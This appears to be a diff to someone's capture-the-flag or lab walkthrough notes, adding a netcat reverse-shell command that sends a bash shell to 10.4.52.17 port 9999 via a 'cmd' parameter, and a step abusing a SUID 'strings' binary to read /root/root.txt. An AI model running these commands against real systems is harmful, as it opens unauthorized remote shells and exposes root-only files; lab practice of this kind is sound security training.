@@ -41,3 +41,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 When Http service with port 22 cannot open in browser, change the http proxy setting manually by inserting ip and port.
 
+cmd=nc -e /bin/bash 10.4.52.17 9999 (sometimes Netcat traditional reverse-shell can only be used).
+
+/usr/bin/strings (strings suid file is exploited)
+#strings /root/root.txt 
+
+
